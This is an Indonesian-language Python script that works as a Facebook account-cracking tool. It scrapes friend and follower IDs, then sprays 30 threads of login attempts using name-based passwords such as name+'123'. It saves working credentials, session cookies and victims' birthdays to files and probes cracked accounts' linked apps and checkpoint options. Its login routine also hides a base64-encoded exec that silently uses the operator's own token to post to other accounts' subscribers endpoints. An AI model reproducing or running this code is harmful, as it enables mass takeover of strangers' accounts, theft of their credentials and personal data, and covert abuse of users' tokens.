# -*- coding: utf-8
# author by Mr.Bidosto
import os
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")

import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def logo():
	os.system("clear")
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	print(" \033[0;93mby .\33[31;1mBidosto___ ___ __  __ ___ _    ___   ___ ___  \n \033[0;93m/ __|_ _|  \/  | _ \ |  | __| | _ ) __| \n \033[0;92m\__ \| || |\/| |  _/ |__| _|  | _ \ _|  \n \033[0;92m|___/___|_|  |_|_| |____|___| |___/_|\n [*] IP Address : %s\033[0;92m\n"%(ip))

def login():
	os.system("clear")
	try:
		#-> test koneksi
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit(" [!] tidak ada koneksi internet")
	try:
		token = open("login.txt", "r")
		menu()
	except (KeyError, IOError):
		print(" [*] sebelum masuk ke menu harus login terlebih dahulu")
		print(" [*] untuk login silakan masukan token facebook anda")
		print(" [?] ketik '\033[0;93mhelp\033[0;93m' untuk lihat tutorial ambil token facebook")
		token = raw_input("\n [+] TOKEN FB BUKAN TOKEN LISTRIK : ")
		if token == "":
			exit("\n [!] jangan kosong")
		elif token == "help":
			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
			exit(" [!] SIMAK AGAR FAHAM NJING")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			import base64
			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMTYxODkvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzExODY5OTU3NzQvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAxNTA3MzUwNjA2Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyODQ5NDcwOTkwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDIxNjMxODc2NTAvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMzA1ODgxMzc0OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEwOTk4NzY0Njc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQo="))
			open("login.txt", "w").write(token)
			print("\n [\33[31;1m+] USER AKTIF, SELAMAT DATANG NJING :v \033[0;93m%s\033[0;93m"%(nama))
			time.sleep(1)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" [!] TOKEN KADALUWARSA")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" [!] TOKEN KADALUWARSA")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
	except IOError:
		os.system("rm -f login.txt")
		exit(" [!] TOKEN KADALUWARSA")
	except requests.exceptions.ConnectionError:
		exit(" [!] tidak ada koneksi internet")
	logo()
	print(" [ WALCOME \033[0;94m%s\033[0;94m ]\n"%(nama))
	print(" [1] CRACK  DARI PUBLIK ATAU TEMAN")
	print(" [2] CRACK  DARI PENGIKUT PUBLIK")
	print(" [3] CRACK DARI TARGET MASSAL")
	print(" [4] LIHAT HASIL CRACK")
	print(" [5] CEK OPSI HASIL CRACK")
	print(" [6] SETTING USER-AGENT")
	print(" \33[31;1m[0]\033[0;93m KELUAR (HAPUS TOKEN)")
	angga = raw_input("\n [\33[33;1m?] CHOOSE : ")
	if angga == "":
		menu()
	elif angga == "1":
		publik()
		method()
	elif angga == "2":
		follower()
		method()
	elif angga == "3":
		massal()
		method()
	elif angga == "4":
		print("\n [1] cek hasil crack OK")
		print(" [2] cek hasil crack CP")
		cek = raw_input("\n [?] CHOOSE : ")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print(" [*] list nama file tersimpan di folder OK\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu()
				totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;92m"%(del_txt, len(totalok)))
			os.system("cat OK/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		elif cek == "2":
			dirs = os.listdir("CP")
			print(" [*] list nama file tersimpan di folder CP\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu()
				totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" [#] ----------------------------------------------")
			print(" [+] hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;97m [#] ----------------------------------------------")
			exit(" [!] jangan lupa di copy dan di simpan hasilnya")
		else:
			menu()
	elif angga == "5":
		cek_opsi()
	elif angga == "6":
		setting_ua()
	elif angga == "0":
		os.system("rm -f login.txt")
		exit("\n [#] BERHASIL MENGHAPUS TOKEN")
	else:
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] TOKEN KADALUWARSA")
	print(" [\33[33;1m+] ISI 'me' JIKA INGIN DARI DAFTAR TEMAN")
	idt = raw_input(" [+] ID TARGET : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print(" [+] total id  : \033[0;91m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print( " [\33[33;1m+] ISI 'me' JIKA INGIN DARI PENGIKUT SENDIRI")
	idt = raw_input(" [+] ID TARGET : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print(" [\33[31;1m+] TOTAL ID : \033[0;91m%s\033[0;97m"%(len(id))) 

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!]\33[33;1m* TOKEN KADALUWARSA")
	try:
		tanya_total = int(raw_input(" [+] JUMLAH TARGET ID : "))
	except:tanya_total=1
	print(" [\33[33;1m+] ISI 'me' JIKA INGIN DARI TEMAN SENDIRI")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" [ \33[31;1m+] ID TARGET %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" [!] akun tidak tersedia atau list teman private")
	print(" [\33[31;1m+] TOTAL ID  : \033[0;91m%s\033[0;97m"%(len(id)))

def method():
	print(" \n [\033[0;93m0\033[0;93m] PILIH METHOD CRACK - COBA SATU?? ]\n")
	print(" [1]METHOD API (fast crack)")
	print(" [2]METHOD FREE (fast crack)")
	print(" [3]METHOD MBASIC (slow crack)")
	print(" [4]METHOD MOBILE (slow crack)")
	method = raw_input("\n [+] METHOD : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input(" [?\33[33;1m] GUNAKAN PW MANUAL? Y/T: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[31;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM :v\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, asu)
			exit("\n\n [#] SELESAI")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM  :v\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(api, uid, pwx)
			exit("\n\n [#] SELESAI")
	elif method == "2":
		ask = raw_input(" [?\33[33;1m] GUNAKAN PW MANUAL? Y/T: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE HELIKOPTER 1 JAM :v\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https:/free.facebook.com")
			exit("\n\n [#] done njing...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM :V \n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://free.facebook.com")
			exit("\n\n [#] SELESAI")
	elif method == "3":
		ask = raw_input(" [?\33[33;1m] GUNAKAN PW MANUAL? Y/T: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\y [\33[33;1m+] HASIL OK TERSIMPAN DI:\33[0;32mOK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI :\33[33;1mCP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM :v\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://mbasic.facebook.com")
			exit("\n\n [#] SELESAI")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM :v\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
			exit("\n\n [#] SELESAI")
	elif method == "4":
		ask = raw_input(" [?]\33[5;36m\33 GUNAKAN PW MANUAL? Y/T: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [*] contoh pass : sayang,anjing,bangsat")
				asu = raw_input(" [?] set pass : ").split(",")
				if len(asu) =="":
					exit(" [!] jangan kosong")
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM :v\n")
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://m.facebook.com")
			exit("\n\n [#] SELESAI")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [\33[33;1m+] HASIL OK TERSIMPAN DI : OK/%s.txt"%(tanggal))
				print(" [\33[33;1m+] HASIL CP TERSIMPAN DI : CP/%s.txt\n"%(tanggal))
				print(" [!\33[31;1m]\033[0;91m\033 JIKA TDK ADA HASIL HIDUPKAN MODE PESAWAT 1 JAM :v\n")
				for user in id:
					uid, name = user.split("<=>")
					if len(name)>=6:
						pwx = [ name+"123", name+"12345" ]
					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
						pwx = [ name+"123", name+"12345" ]
					else:
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://m.facebook.com")
			exit("\n\n [#] SELESAI")
		else:
			exit("\n [!] isi yang bener")
	else:
		menu() 

def api(uid, pwx):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [\33[33;1m+]????CRACK  [%s????%s]\33[0;32mOK????%s????\33[31;1mCP????%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r  \33[33;1m*???????>%s = %s = %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s =  %s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("*???????>%s = %s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r  \33[33;1m*???????>%s = %s = %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s = %s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("*???????>%s = %s = %s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  \33[33;1m*???????>%s = %s\033[0;97m        "%(uid, pw))
			cp.append("%s = %s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" *???????>%s = %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def crack(uid, pwx, host, **kwargs):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [\33[0;36m+]????CRACK   [%s????%s]\33[0;32mOK %s????\33[31;1mCP %s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r  \33[33;1m*???????> %s = %s = %s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s = %s"%(uid, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" \33[33;1m*???????> %s = %s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				try:
					token = open("login.txt", "r").read()
					with requests.Session() as ses:
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = bulan_ttl[month]
						print("\r  \33[33;1m*???????>%s = %s = %s %s %s\033[0;97m"%(uid, pw, day, month, year))
						cp.append("%s = %s"%(uid, pw))
						open("CP/%s.txt"%(tanggal),"a").write(" \33[33;1m*>>> %s = %s = %s %s %s\n"%(uid, pw, day, month, year))
						break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r \33[33;1m*???????>%s = %s \033[0;97m        "%(uid, pw))
				cp.append("%s = %s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write(" \33[33;1m*???????>%s = %s\n"%(uid, pw))
				break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")

def setting_ua():
	print("\n [ pilih user-agent hp anda ]\n")
	print(" [1] XIAOMI")
	print(" [2] SAMSUNG")
	print(" [3] NOKIA")
	print(" [4] ASUS")
	print(" [5] HUAWEI")
	print(" [6] USER-AGENT MANUAL")
	ua = raw_input("\n [?] CHOOSE : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [+] BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "2":
		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [+] BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "3":
		c_ua = ("Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [+] BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "4":
		c_ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [+] BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "5":
		c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [+] BERHASIL GANTI USER AGENT")
		menu()
	elif ua == "6":
		c_ua = raw_input(" [+] USER-AGENT : ")
		if c_ua == "":
			exit("\n [!] jangan kosong")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [+] BERHASIL GANTI USER AGENT")
		menu()
	else:
		menu()

#-> Cek Opsi
def cek_opsi():
	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" [?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	print(" [+] total akun : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
	print(" [*] sedang prosess cek akun....")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  \33[33;1m*???????> ","")))
		try:
			check_in(titid[0].replace("  \33[33;1m*???????>",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n [!] cek akun sudah selesai...")
	raw_input(" [+] pencet enter untuk kembali ke menu ")
	time.sleep(1)
	menu()

def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" [+] terdapat "+str(len(ngew))+" opsi ")
		for opt in range(len(ngew)):
			print(" ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] login gagal, silahkan cek kembali id dan password")
	
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()